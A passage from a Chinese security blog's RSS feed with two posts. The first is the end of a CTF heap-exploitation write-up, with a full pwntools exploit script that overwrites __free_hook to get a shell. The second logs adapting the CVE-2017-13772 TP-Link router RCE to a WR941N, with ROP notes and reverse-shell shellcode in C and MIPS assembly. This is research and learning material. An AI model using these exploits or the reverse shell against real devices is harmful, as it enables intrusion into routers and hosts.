<p>这个时候只需要在free box2之前，malloc一个box5，这样将会把unsortbin中的box3分类到smallbin中，从而bypass unsortbin check</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在free box2之后，内存大致如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/6gx 0x202100+0x555555554000</div><div class="line">0x555555756100:	0x0000000000000000 0x0000555555757420</div><div class="line">0x555555756110:	0x0000555555757440 0x0000555555756100</div><div class="line">0x555555756120:	0x00005555557575b0 0x0000555555757680</div></pre></td></tr></table></figure>
<p>box3的地址已经指向该bss段，从而我们已经可以做到任意地址写了</p>
<p>我的利用思路是，把box 2修改为free_hook的地址，然后把box 0修改为<code>/bin/sh\0</code>正好8byte，这样box 3就是一个<code>/bin/sh</code>字符串了</p>
<p>我们只需要在free_hook中写上system的地址，调用free(box 3)，则相当于调用system(“/bin/sh\0”)，从而达到getshell</p>
<p>完整payload如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">    context.log_level = <span class="string">"debug"</span></div><div class="line">    r = process(<span class="string">"./club"</span>)</div><div class="line">    e = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    r = remote(<span class="string">"123.206.22.95"</span>, <span class="number">8888</span>)</div><div class="line">    e = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"></div><div class="line">malloc_hook = e.symbols[<span class="string">'__malloc_hook'</span>]</div><div class="line">free_hook = e.symbols[<span class="string">'__free_hook'</span>]</div><div class="line">system_address = e.symbols[<span class="string">'system'</span>]</div><div class="line">top_chunk = malloc_hook + <span class="number">0x68</span></div><div class="line">seed_address = <span class="number">0x202148</span></div><div class="line">addr_list = <span class="number">0x202100</span></div><div class="line">one_gadget = <span class="number">0xf0274</span></div><div class="line">puts_got = <span class="number">0x202028</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_box</span><span class="params">(n, l)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"1"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(l))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_box</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(n, msg)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"3"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line">    r.sendline(msg)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_message</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"4"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_num</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"5"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_num</span><span class="params">()</span>:</span></div><div class="line">    guess_num(<span class="number">123</span>)</div><div class="line">    r.readuntil(<span class="string">"is "</span>)</div><div class="line">    random_num = int(r.readuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">return</span> random_num</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">guest</span><span class="params">(random_num)</span>:</span></div><div class="line">    seed_base = <span class="number">0x202148</span></div><div class="line">    libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0x10000000</span>, <span class="number">0xfffff000</span>, <span class="number">0x1000</span>):</div><div class="line">        libc.srand(x+seed_base)</div><div class="line">        <span class="keyword">if</span> libc.rand() == random_num:</div><div class="line">            next_randnum = libc.rand()</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> next_randnum</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_elf_base</span><span class="params">(random_num)</span>:</span></div><div class="line">    guess_num(random_num)</div><div class="line">    r.readuntil(<span class="string">"secret:"</span>)</div><div class="line">    elf_base = int(r.readuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">return</span> elf_base-seed_address</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_libc_base</span><span class="params">()</span>:</span></div><div class="line">    free_box(<span class="number">3</span>)</div><div class="line">    show_message(<span class="number">3</span>)</div><div class="line">    data = r.readuntil(<span class="string">"You"</span>)[:<span class="number">-3</span>].strip()</div><div class="line">    top = u64(data+<span class="string">"\x00\x00"</span>)</div><div class="line">    <span class="keyword">return</span> top - top_chunk</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    random_num = get_rand_num()</div><div class="line">    next_randnum = guest(random_num)</div><div class="line">    elf_base = get_elf_base(next_randnum)</div><div class="line">    <span class="keyword">print</span> <span class="string">"get ELF base address: 0x%x"</span>%elf_base</div><div class="line">    create_box(<span class="number">1</span>, <span class="number">24</span>)</div><div class="line">    create_box(<span class="number">2</span>, <span class="number">168</span>)</div><div class="line">    create_box(<span class="number">3</span>, <span class="number">184</span>)</div><div class="line">    create_box(<span class="number">4</span>, <span class="number">200</span>)</div><div class="line">    libc_base = get_libc_base()</div><div class="line">    create_box(<span class="number">5</span>, <span class="number">300</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"get libc base address: 0x%x"</span>%libc_base</div><div class="line">    set_list2_size = p64(<span class="number">0xc1</span>)*<span class="number">3</span> + <span class="string">"\xc1"</span></div><div class="line">    leave_message(<span class="number">1</span>, set_list2_size)</div><div class="line">    set_list3 = p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>) + p64(elf_base+addr_list) + p64(elf_base+addr_list+<span class="number">8</span>)</div><div class="line">    set_list3 += <span class="string">"a"</span>*<span class="number">0x90</span>+p64(<span class="number">0xb0</span>)</div><div class="line">    leave_message(<span class="number">3</span>, set_list3)</div><div class="line">    free_box(<span class="number">2</span>)</div><div class="line">    write_address_list = <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span>*<span class="number">8</span> + p64(libc_base+free_hook)</div><div class="line">    leave_message(<span class="number">3</span>, write_address_list)</div><div class="line">    leave_message(<span class="number">2</span>, p64(libc_base+system_address))</div><div class="line">    free_box(<span class="number">3</span>)</div><div class="line">    <span class="comment"># leave_message(3, "aaaaaaaa")</span></div><div class="line">    <span class="comment"># show_message(3)</span></div><div class="line">    r.interactive()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>unlink原理很早我就知道了，但是却是第一次实践，理论和实际还是差很大的，所以我踩了挺多的坑，花了挺多的时间</p>
<p>我还考虑过fastbin的double free的利用，但是失败了……</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/11/03/0x3C/#disqus_thread</comments>
    </item>
    
    <item>
      <title>TP-Link WR941N路由器研究</title>
      <link>http://0x48.pw/2017/10/30/0x3B/</link>
      <guid>http://0x48.pw/2017/10/30/0x3B/</guid>
      <pubDate>Mon, 30 Oct 2017 03:07:10 GMT</pubDate>
      <description>
      
        &lt;p&gt;之前看到了一个CVE, &lt;a href=&quot;https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CVE-2017-13772&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;是TP-Link WR940N后台的RCE, 手头上正好有一个TP-Link WR941N的设备，发现也存在相同的问题，但是&lt;code&gt;CVE-2017-13772&lt;/code&gt;文章中给的EXP并不通用&lt;/p&gt;
&lt;p&gt;所以准备进行复现和exp的修改，折腾了将近4天，记录下过程和遇到的坑&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>之前看到了一个CVE, <a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">CVE-2017-13772</a></p>
<p>是TP-Link WR940N后台的RCE, 手头上正好有一个TP-Link WR941N的设备，发现也存在相同的问题，但是<code>CVE-2017-13772</code>文章中给的EXP并不通用</p>
<p>所以准备进行复现和exp的修改，折腾了将近4天，记录下过程和遇到的坑</p>
<a id="more"></a>
<p>第一次研究mips指令的RCE，之前只学了intel指令集的pwn，所以进度挺慢的</p>
<h1 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h1><p>第一天当然是配环境了，该路由器本身在默认情况下是不提供shell的，在@fenix帮助下获取到了路由器的shell，该款路由器上的busybox的命令比较少，curl, nc, wget这些命令都没有，只能用tftp进行数据传输，而且只有<code>/tmp</code>目录可写，路由器重启后，传上去的文件就没了，这些问题都可以通过刷固件解决，不过太麻烦了，只需要传上去一个<code>gdbserver</code>就好了，能根据固件中的bin得知这是一个大端mips指令集的设备，<code>gdbserver</code>也不用自己编译，直接下编译好的: <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="external">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>
<p>把<code>gdbserver.mipsbe</code>通过tftp上传到路由器的<code>/tmp</code>目录下</p>
<p>然后根据<code>cve-2017-13772</code>分析文章说的那样使用gdbserver attach httpd最新的一个进程，然后就可以进行远程gdb调试了</p>
<h1 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h1><p>第二天准备开始调试，但是发现gdb的两个编译选项, 一个<code>--host</code>，表示gdb运行的环境，一般默认就是本机环境，还有一个<code>--target</code>表示调试的目标环境，默认也是本机环境，所以一个64位ubuntu上默认的gdb只能调试64 elf程序。所以需要设置<code>--target=mipsbel-linux</code>参数进行编译gdb，才能调试大端的mips程序。</p>
<p>编译差不多编译了半天，准备改天搞一个8核的机器专门来编译程序….</p>
<p>编译成功后，就可以进行远程调试了，在路由器上执行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; /tmp/gdbserver.mipsbe attach 0.0.0.0:12345 pid</div></pre></td></tr></table></figure>
<p>然后使用编译好gdb进行调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ gdb</div><div class="line">(gdb) target remote 192.168.1.1:12345</div></pre></td></tr></table></figure>
<p>但是失败了，又折腾了半天</p>
<h1 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h1><p>第三天才真正的开始调试程序，首先说说我第二天遇到的问题，问题是下了断点没用，原因比较傻逼，我下断点的地址是wr940n的地址，我把两个bin搞混了</p>
<p>然后根据<code>cve-2017-13772</code>分析文章中说的栈溢出的指令，在wr941n中也找到了该指令，而溢出情况也是一样，所以拿了wr940n的exp来打了一遍，结果当然是失败了。</p>
<p>在wr940n的exp中，ROP是在<code>libuClibc-0.9.30.so</code>中找的，根据<code>$ cat /proc/pid/maps</code>命令，发现wr941n路由器的基地址和文章中显示的wr940n路由器的是一样的，然后再比较<code>libuClibc-0.9.30.so</code>文件的hash值，发现不同，所以要修改ROP地址。</p>
<p>由于libc文件太大，用手找太累了，所以使用了那篇文章中的ida的mipsrop插件，这里又踩了一个坑，因为我用的是ida7.0，而这个插件只能在ida6.8(更低的没试过)版本使用。</p>
<p>修改了ROP后，再进行尝试exp，发现仍然失败，然后进行调试查看原因，跟踪ROP执行流，发现能成功跳转到栈上执行shellcode，但是shellcode和文章中的，文章中的shellcode开头有一个使用xor进行解密的过程，执行完之后的指令和文章中的不一样。所以准备自己写一个shellcode</p>
<h1 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h1><p>第四天就是开始写shellcod，首先给个mips指令和bin互转的网站：<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly" target="_blank" rel="external">http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly</a></p>
<p>然后说说写的过程中遇到的问题，该路由器输入是不接受<code>\x00</code>和<code>\x20</code>，所以ROP不是在ELF中寻找而是去libc中寻找：<code>libuClibc</code>基地址：<code>0x2aae000</code>， <code>httpd</code>基地址：<code>0x00400000</code></p>
<p>如果在ELF中寻找ROP，则地址中总会有个<code>\x00</code>，所以ROP是在libc中寻找不存在<code>\x00</code>和<code>\x20</code>的地址。但是在shellcode中，这两个字符却很难避免，所以那篇文章中对shellcode进行了xor加密</p>
<p>wr940n的exp使用的是一个bind shell的shellcode，而我改成了一个反弹shell的shellcode</p>
<p>然后就是最后遇到的一个大坑，使用gdb调试成功的一个反弹shell的shellcode，在实际测试中却失败了，使用gdb成功，直接打失败，因为这个问题折腾了挺长的时间</p>
<p>然后查阅资料，在看雪的一篇文章中找到了原因：<https: www.kanxue.com="" article-read-218.htm=""></https:></p>
<blockquote>
<p>mips 的 exp 编写中还有一个问题就是 cache incoherency。MIPS CPUs 有两个独立的 cache：指令 cache 和数据 cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发 flush，将数据写回到主内存。攻击者的攻击 payload 通常会被应用当做数据来处理，存储在数据缓存中。当 payload 触发漏洞，劫持程序执行流程的时候，会去执行内存中的 shellcode。<br>如果数据缓存没有触发 flush 的话，shellcode 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 shellcode 的地址处随机的代码，导致不可预知的后果。<br>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如 sleep(1) 或者其他类似的函数。sleep 的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行 flush。</p>
</blockquote>
<p>这个坑点在那篇文章中也提及了，但是没具体说明，如果没实际踩一踩，不一定能理解。但是讲道理，如果直接用wr940n的exp，修改下ROP地址和shellcode，应该是不会遇到这个坑的，但是我仍然遇到了，经过研究发现，是usleep的问题，猜测是由于堵塞的时间过短所以未执行flush？然后进行实际测试了一番，把usleep的时间修改为<code>18217</code>，同样没用，然后简单看了下两者的汇编，发现usleep只是简单的调用nanosleep，而sleep除了调用nanosleep还进行其他相关的操作，网上没搜到相关文章，因为精力有限，作为遗留问题，以后有时间的时候再继续研究。</p>
<p>不过有几个猜测，</p>
<p>1.时间问题，usleep的单位是微秒，18217也只有10ms，是不是要睡到1s？因为找不到合适的ROP，所以暂时没法证明<br>2.flush内存是靠sleep中的几个信号相关的函数？</p>
<p>所以最终我的做法是在wr940n的exp的ROP链中，调用的是usleep(0xc*2+1)，但是我将usleep改成sleep =&gt; sleep(0xc*2+1)，数据缓存被成功flush到主内存中，就能成功执行shellcode了</p>
<h1 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h1><p>在本次研究中，最后时间的除了一开始的调试环境搭建外，就是shellcode的编写了，因为在那篇cve分析的文章中已经给出了wr940n的exp，ROP只需要修改修改地址就好了，所以工作量最大的还是在Shellcode的编写这一部分</p>
<p>首先是syscall部分，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">li $v0, 4183</div><div class="line">syscall 0x40404</div><div class="line"># sys_socket</div></pre></td></tr></table></figure>
<ul>
<li>mips采用的是RISC，32位系统下，指令固定采用4byte，syscall的字节码是<code>\x0c</code>，剩余的三字节默认用<code>\x00</code>补全，但是因为路由器不接受<code>\x00</code>的输入，所以在大端的情况下改成<code>\x01\x01\x01\x0c</code>，进行反汇编，就是<code>syscall 0x40404</code></li>
</ul>
<p>系统调用的相关函数除了几个mips特有的，其他的都是跟linux下的syscall一样，可参考: <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h</a></p>
<p>比如<code>sys_socket</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define __NR_Linux			4000</div><div class="line">#define __NR_socket			(__NR_Linux + 183)</div></pre></td></tr></table></figure>
<p>所以<code>$v0=4183</code>表示的就是socket函数，具体参数信息可以去参考linux的系统调用: <a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="external">http://asm.sourceforge.net/syscall.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int sys_socket(int family, int type, int protocol)</div></pre></td></tr></table></figure>
<p>现在，先用c来实现一遍反连shell的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ cat test.c</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;netinet/in.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">	int sockfd;</div><div class="line">	sockfd = socket(2,2,0);</div><div class="line">	struct sockaddr_in addr;</div><div class="line">	addr.sin_family = 2;</div><div class="line">	addr.sin_port = 0x3039;</div><div class="line">	addr.sin_addr = 0xc0a80164;</div><div class="line">	connect(sockfd, &amp;addr, sizeof(addr))</div><div class="line">	dup2(sockfd, 0);</div><div class="line">	dup2(sockfd, 1);</div><div class="line">	dup2(sockfd, 2);</div><div class="line">	execve(&quot;//bin/sh&quot;, 0, 0);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里有个关键点，<a href="https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h" target="_blank" rel="external">https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h</a></p>
<p>和其他架构不一样，mips架构中，tcp是2，udp是1</p>
<p>所以上面的代码比如在ubuntu中，是一个udp反连的代码，但是在mips中就是tcp反连</p>
<p>还有一点就是wr941n是大端，所以12345端口是0x3039而不是0x3930，ip地址同理</p>
<p>然后把上面代码转换成mips指令的汇编</p>
<p>但是有个问题，之前说了该路由器不接收<code>\x00</code>和<code>\x20</code>两个字符，而上面的汇编转换成字节码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nor     $a0,$t7,$zero   =&gt;   &quot;\x01\xe0\x20\x27&quot;</div></pre></td></tr></table></figure>
<p>所以要把这句指令进行修改, 因为<code>$a0</code>和<code>$a1</code>的值都为2，所以可以这样修改：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sw      $a1,-1($sp)  =&gt;  &quot;\xaf\xa5\xff\xff&quot;</div><div class="line">lw      $a0,-1($sp)  =&gt;  &quot;\x8f\xa4\xff\xff&quot;</div></pre></td></tr></table></figure>
<p>把上面的汇编转成shellcode替换exp中的shellcode，实际测试，又发现一个问题，设备成功反连了控制端，但是却不能执行命令，到路由器上用ps查看，发现<code>sh</code>已经变为僵尸进程</p>
<p>经研究，问题出在<code>execve(&quot;/bin/sh&quot;,0,0)</code>，如果我修改成<code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, 0], 0)</code>则成功反弹shell，可以任意命令执行</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/</a></li>
<li><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="external">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></li>
<li><a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly" target="_blank" rel="external">http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly</a></li>
<li><a href="https://www.kanxue.com/article-read-218.htm" target="_blank" rel="external">https://www.kanxue.com/article-read-218.htm</a></li>
<li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h</a></li>
<li><a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="external">http://asm.sourceforge.net/syscall.html</a></li>
<li><a href="https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h" target="_blank" rel="external">https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/10/30/0x3B/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
